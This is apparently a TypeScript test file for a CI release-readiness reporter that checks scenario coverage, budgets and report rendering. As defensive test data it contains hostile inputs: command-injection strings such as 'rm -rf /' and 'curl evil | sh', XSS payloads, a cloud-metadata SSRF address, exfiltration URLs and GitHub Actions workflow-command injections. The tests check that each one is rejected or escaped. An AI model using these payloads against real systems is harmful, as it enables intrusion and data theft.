import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { test } from "node:test";
import { appsTouched } from "../src/ci/build.ts";
import { render, ReportInput, safe } from "../src/ci/report.ts";
import { canRetest, driverChoice, logTail, Meta, tighten } from "../src/ci/run.ts";
import { onOrigin } from "../src/env.ts";
import { assess } from "../src/report/readiness.ts";
import { planToDraft } from "../src/drivers/recorded.ts";
import { PlanDraft, type RunReport } from "../src/schema.ts";

const recording = async () =>
  JSON.parse(await readFile(new URL("../../../eval/recordings/NWG-342.json", import.meta.url), "utf8")) as RunReport;
/** The recording with its waiting scenarios removed: every requirement compared, nothing left open. */
const complete = async () => {
  const run = await recording();
  run.plan.scenarios = run.plan.scenarios.filter((s) => s.status !== "blocked");
  run.plan.clarifications = [];
  return run;
};
const input = (run: RunReport) => ReportInput.parse({ status: "completed", repo: "acme/widgets", pr: 1, headSha: "b".repeat(40), run });
const RUN_URL = "https://github.com/acme/widgets/actions/runs/123";

test("which application a pull request touches is decided by the nearest manifest", () => {
  const manifests = new Set(["apps/one", "apps/two", "."]);
  const has = (dir: string) => manifests.has(dir);
  assert.deepEqual(appsTouched(["apps/one/src/a.ts", "apps/one/README.md"], has), ["apps/one"]);
  assert.deepEqual(appsTouched(["apps/one/a.ts", "apps/two/b/c.ts"], has), ["apps/one", "apps/two"]);
  assert.deepEqual(appsTouched(["docs/x.md"], has), ["."]);
  assert.deepEqual(appsTouched(["docs/x.md"], () => false), []);
});

test("the build stage's description is checked field by field", () => {
  const sha = "a".repeat(40);
  assert.ok(Meta.safeParse({ pr: 7, headSha: sha, appDir: "apps/one" }).success);
  for (const bad of [
    { pr: 7, headSha: "abc" },
    { pr: -1, headSha: sha },
    { pr: 7, headSha: sha, appDir: "../../etc" },
    { pr: 7, headSha: sha, appDir: "/etc" },
    { pr: 7, headSha: sha, appDir: "apps/$(id)" },
    { pr: "7; rm -rf /", headSha: sha },
  ]) {
    assert.equal(Meta.safeParse(bad).success, false, JSON.stringify(bad));
  }
});

test("untrusted text cannot carry markup, mentions or links into a comment", () => {
  const out = safe('<img src=x onerror=1> @octocat [click](https://evil.example) `code`\n| a | **b**');
  assert.doesNotMatch(out, /<img|\n/);
  assert.doesNotMatch(out, /@octocat/);
  assert.doesNotMatch(out, /\]\(https:\/\//);
  assert.match(out, /&lt;img/);
  assert.equal(safe("x".repeat(500), 50).length, 51);
});

test("a completed run renders with failures first and a failing conclusion", async () => {
  const run = await recording();
  run.executionMode = "autonomous";
  run.results[0]!.verdict = "failed";
  run.results[0]!.assertionResults[0]!.pass = false;
  const input = ReportInput.parse({ status: "completed", repo: "acme/widgets", pr: 1, headSha: "b".repeat(40), run });
  const out = render(input, RUN_URL);
  assert.equal(out.conclusion, "failure");
  assert.match(out.title, /^Not ready: 1 failed, \d+ passed · \d+ of \d+ requirements verified · \d+ scenarios blocked \(autonomous\)$/);
  assert.match(out.body, /### Release readiness: Not ready/);
  assert.match(out.body, /Execution mode: autonomous/);
  assert.match(out.body, /^<!-- releaseproof-report -->/);
  assert.match(out.body, /### Failures/);
  assert.match(out.body, /Requirement R\d+: "/);
  assert.ok(out.body.length < 60_100);
});

test("a run is green only when every documented requirement was compared and nothing is left open", async () => {
  const run = await complete();
  run.executionMode = "autonomous";
  const ready = render(input(run), RUN_URL);
  assert.equal(ready.conclusion, "success");
  assert.match(ready.title, /^Ready: 0 failed, 9 passed · 29 of 29 requirements verified \(autonomous\)$/);
  assert.match(ready.body, /### Release readiness: Ready/);
  assert.doesNotMatch(ready.body, /### Requirements not verified/);
});

test("everything that ran passing is not a pass while planned scenarios wait on a decision", async () => {
  const run = await recording();
  run.executionMode = "autonomous";
  assert.ok(run.results.every((r) => r.verdict === "passed"));
  const out = render(input(run), RUN_URL);
  assert.equal(out.conclusion, "neutral");
  assert.match(out.title, /^Incomplete: 0 failed, 9 passed · 29 of 29 requirements verified · 8 scenarios blocked/);
  assert.match(out.body, /### Release readiness: Incomplete/);
  assert.match(out.body, /8 planned scenarios are waiting on a decision or a capability/);
});

test("each documented requirement gets exactly one coverage status, with the reason", async () => {
  const run = await complete();
  const planned = run.plan.scenarios[0]!;
  const requirementId = planned.scenario.assertions[0]!.requirementId!;
  const only = (id: string) => run.plan.scenarios.every((s) => s === planned || s.scenario.assertions.every((a) => a.requirementId !== id));
  // Find a requirement that only the first scenario compares, so its status depends on that scenario alone.
  const sole = planned.scenario.assertions.map((a) => a.requirementId!).find(only);
  assert.ok(sole, "the recording has a requirement only its first scenario compares");
  const target = sole ?? requirementId;
  const status = () => assess(run).requirements.find((r) => r.id === target)!.status;
  assert.equal(status(), "verified");

  const result = run.results.find((r) => r.scenarioId === planned.scenario.id)!;
  const kept = result.assertionResults;
  if (sole) {
    // Executed, but the comparison was never made.
    result.verdict = "unverified";
    result.reason = "Not executed: the run's cost limit was reached.";
    result.assertionResults = [];
    assert.equal(status(), "unverified");
    assert.equal(assess(run).readiness, "incomplete");
    assert.match(render(input(run), RUN_URL).body, /### Requirements not verified[\s\S]*unverified/);

    // Planned for it, never started.
    run.results = run.results.filter((r) => r !== result);
    planned.status = "blocked";
    planned.blockedReason = "The ticket does not say what should happen.";
    planned.scenario.requirementIds = [sole];
    assert.equal(status(), "blocked");

    // No scenario mentions it at all.
    run.plan.scenarios = run.plan.scenarios.filter((s) => s !== planned);
    assert.equal(status(), "not planned");
    assert.equal(render(input({ ...run, executionMode: "autonomous" }), RUN_URL).conclusion, "neutral");
    run.plan.scenarios.unshift(planned);
    run.results.unshift(result);
    planned.status = "runnable";
    result.verdict = "failed";
    result.assertionResults = kept;
  }
  // A mismatch outranks any number of matches.
  result.verdict = "failed";
  kept.find((a) => planned.scenario.assertions.find((p) => p.id === a.assertionId)?.requirementId === target)!.pass = false;
  assert.equal(status(), "failed");
  assert.equal(assess(run).readiness, "not ready");
  const counts = assess(run).counts;
  assert.equal(Object.values(counts).reduce((a, b) => a + b, 0), assess(run).requirements.length);
});

test("scenarios dropped by the limit and runs that ended early are never green", async () => {
  const trimmed = await complete();
  trimmed.executionMode = "autonomous";
  trimmed.plan.trimmedRunnable = 3;
  const out = render(input(trimmed), RUN_URL);
  assert.equal(out.conclusion, "neutral");
  assert.match(out.body, /3 runnable scenarios were dropped to stay within the scenario limit/);
  const stopped = await complete();
  stopped.executionMode = "autonomous";
  stopped.stopped = "cost limit of $2 reached";
  assert.equal(render(input(stopped), RUN_URL).conclusion, "neutral");
});

test("the comment shows usage by stage and what the model-free repeat of a failure found", async () => {
  const run = await complete();
  run.executionMode = "autonomous";
  run.results[0]!.verdict = "failed";
  run.results[0]!.assertionResults[0]!.pass = false;
  run.confirmations = { [run.results[0]!.scenarioId]: "reproduced" };
  const stage = (usd: number) => ({ calls: 1, inputTokens: 10, outputTokens: 5, cacheReadTokens: 100, cacheWriteTokens: 0, toolCalls: 2, usd });
  run.usage = {
    byStage: { analyse: stage(0.4), execute: stage(1.1) },
    total: stage(1.5),
    estimatedUsd: 1.5,
    minutes: 3,
    limits: { maxTokens: 1, maxUsd: 4, maxMinutes: 20 },
    prices: { input: 4, output: 20, cacheRead: 0.2, cacheWrite: 5 },
    apiErrors: [],
  };
  const out = render(input(run), RUN_URL);
  assert.match(out.body, /By stage: analyse 115 tokens \(\$0\.40\), execute 115 tokens \(\$1\.10\)/);
  assert.match(out.body, /Repeatability \(the same steps and locators replayed without a model\): repeats\. This shows whether the result is stable, not whether the locators were right\./);
});

test("blocked or unverified scenarios make the result neutral, never a pass", async () => {
  const run = await complete();
  run.executionMode = "autonomous";
  run.results[1]!.verdict = "unverified";
  run.results[1]!.reason = "Not executed: the run's cost limit of $8 reached.";
  const out = render(ReportInput.parse({ status: "completed", repo: "acme/widgets", pr: 1, headSha: "b".repeat(40), run }), RUN_URL);
  assert.equal(out.conclusion, "neutral");
  assert.match(out.body, /### Not verified/);
});

test("hostile content in a result is displayed as text", async () => {
  const run = await recording();
  run.ticketKey = "X-1 <script>alert(1)</script>";
  run.results[0]!.title = "@everyone see [this](https://evil.example/steal)";
  run.results[0]!.verdict = "failed";
  run.results[0]!.assertionResults[0]!.actual = "`; curl evil | sh";
  run.results[0]!.assertionResults[0]!.pass = false;
  const out = render(ReportInput.parse({ status: "completed", repo: "acme/widgets", pr: 1, headSha: "b".repeat(40), run }), "javascript:alert(1)");
  assert.doesNotMatch(out.body, /<script>|@everyone|\]\(https:\/\/evil|javascript:/);
});

test("skipped and failed runs are neutral and give their reason", () => {
  const out = render(ReportInput.parse({ status: "skipped", repo: "acme/widgets", reason: "No ticket ABC-1 is available to this run." }), RUN_URL);
  assert.equal(out.conclusion, "neutral");
  assert.match(out.body, /No ticket ABC-1/);
  assert.throws(() => ReportInput.parse({ status: "completed", repo: "not a repo" }));
});

test("a recorded plan converts back to the shape a model would return", async () => {
  const run = await recording();
  const draft = PlanDraft.parse(planToDraft(run.plan));
  assert.equal(draft.scenarios.length, run.plan.scenarios.length);
  const first = draft.scenarios.find((s) => s.assertions.length > 0)!;
  assert.ok(first.assertions.every((a) => a.requirementId));
});

test("a run without a live model is never green and says what it is", async () => {
  const allPassed = await recording();
  for (const mode of ["recorded", undefined] as const) {
    allPassed.executionMode = mode;
    assert.ok(allPassed.results.every((r) => r.verdict === "passed"));
    const out = render(ReportInput.parse({ status: "completed", repo: "acme/widgets", pr: 1, headSha: "b".repeat(40), run: allPassed }), RUN_URL);
    assert.equal(out.conclusion, "neutral", String(mode));
    assert.match(out.title, /^Recorded replay, not an autonomous run\. Incomplete: 0 failed, 9 passed/);
    assert.match(out.body, /\*\*Recorded replay, not an autonomous run\.\*\* No live model was used/);
    assert.match(out.body, /Execution mode: recorded/);
  }
  // Even a failing recorded run stays neutral; the failure is still listed.
  allPassed.executionMode = "recorded";
  allPassed.results[0]!.verdict = "failed";
  allPassed.results[0]!.assertionResults[0]!.pass = false;
  const failing = render(ReportInput.parse({ status: "completed", repo: "acme/widgets", pr: 1, headSha: "b".repeat(40), run: allPassed }), RUN_URL);
  assert.equal(failing.conclusion, "neutral");
  assert.match(failing.body, /### Failures/);
  // A re-run by replay of an autonomous run is labelled as replay and can pass.
  const replay = await complete();
  replay.executionMode = "replay";
  const replayed = render(ReportInput.parse({ status: "completed", repo: "acme/widgets", pr: 1, headSha: "b".repeat(40), run: replay }), RUN_URL);
  assert.equal(replayed.conclusion, "success");
  assert.match(replayed.title, /\(replay\)$/);
});

test("a requested limit can lower a run's budget but never raise it", () => {
  const base = { limits: { maxUsd: 8, maxTokens: 3_000_000, maxMinutes: 25 }, maxScenarios: 10 };
  assert.deepEqual(tighten(base, { maxUsd: "2.5", maxScenarios: "4", maxMinutes: "15" }), {
    limits: { maxUsd: 2.5, maxTokens: 3_000_000, maxMinutes: 15 },
    maxScenarios: 4,
    disableFallbacks: false,
    executorModel: undefined,
  });
  assert.deepEqual(tighten(base, { maxUsd: "500", maxScenarios: "99", maxMinutes: "600", maxTokens: "9e12" }).limits, base.limits);
  assert.equal(tighten(base, { maxScenarios: "99" }).maxScenarios, 10);
  for (const junk of [null, "x", [], { maxUsd: "-1" }, { maxUsd: "$(id)" }, { maxScenarios: "1.5" }, { maxUsd: {} }]) {
    assert.deepEqual(tighten(base, junk).limits, base.limits, JSON.stringify(junk));
    assert.equal(tighten(base, junk).maxScenarios, 10);
  }
  assert.equal(tighten(base, { disableFallbacks: "true" }).disableFallbacks, true);
  assert.equal(tighten(base, { disableFallbacks: "yes" }).disableFallbacks, false);
});

test("a run may ask for an executor model only from the allow-list", () => {
  const base = { limits: { maxUsd: 8, maxTokens: 3_000_000, maxMinutes: 25 }, maxScenarios: 10 };
  assert.equal(tighten(base, { executorModel: "claude-sonnet-5-5" }).executorModel, "claude-sonnet-5-5");
  for (const bad of ["gpt-x", "claude-sonnet-5-5; id", "", 7, { a: 1 }, "https://evil.example/model"]) {
    assert.equal(tighten(base, { executorModel: bad }).executorModel, undefined, JSON.stringify(bad));
  }
});

test("manifest paths cannot send the trusted runner's requests to another host", () => {
  const base = "http://172.18.0.2:3000";
  assert.equal(onOrigin(base, "/api/test/customers"), "http://172.18.0.2:3000/api/test/customers");
  for (const bad of [
    "https://evil.example/collect",
    "//evil.example/collect",
    "http://169.254.169.254/latest/meta-data/",
    "/\\evil.example/x",
    "\\\\evil.example\\x",
    "api/test",
    "javascript:alert(1)",
    "",
  ]) {
    assert.throws(() => onOrigin(base, bad), JSON.stringify(bad));
  }
});

test("the application's log is printed as bounded text that cannot issue runner commands", () => {
  const hostile = ["::add-mask::x", "::set-output name=a::b", "##[error]boom", "\u001b[31mred\u001b[0m", "y".repeat(5000), "", ...Array(200).fill("line")].join("\n");
  const tail = logTail(hostile, 300);
  assert.ok(tail.every((line) => line.startsWith("app| ") && line.length <= 305 && !/[\u0000-\u001f]/.test(line)));
  assert.ok(tail.includes("app| ::add-mask::x"));
  assert.equal(logTail(hostile).length, 60);
});

test("the live driver is chosen whenever a key is configured, the recording only without one", () => {
  assert.equal(driverChoice("sk-test", true), "live");
  assert.equal(driverChoice("sk-test", false), "live");
  assert.equal(driverChoice("", true), "recorded");
  assert.equal(driverChoice("   ", true), "recorded");
  assert.equal(driverChoice(undefined, true), "recorded");
  assert.equal(driverChoice(undefined, false), "none");
});

test("only a run produced by a live model can be re-run on a later commit", async () => {
  const previous = await recording();
  const hash = "h";
  previous.ticketHash = hash;
  previous.pullRequest.number = 1;
  for (const [mode, expected] of [["autonomous", true], ["replay", true], ["recorded", false], [undefined, false]] as const) {
    previous.executionMode = mode;
    assert.equal(canRetest(previous, 1, hash, false), expected, String(mode));
  }
  previous.executionMode = "autonomous";
  assert.equal(canRetest(previous, 1, hash, true), false, "a full run was asked for");
  assert.equal(canRetest(previous, 2, hash, false), false, "another pull request");
  assert.equal(canRetest(previous, 1, "changed", false), false, "the ticket changed");
  assert.equal(canRetest(undefined, 1, hash, false), false);
});
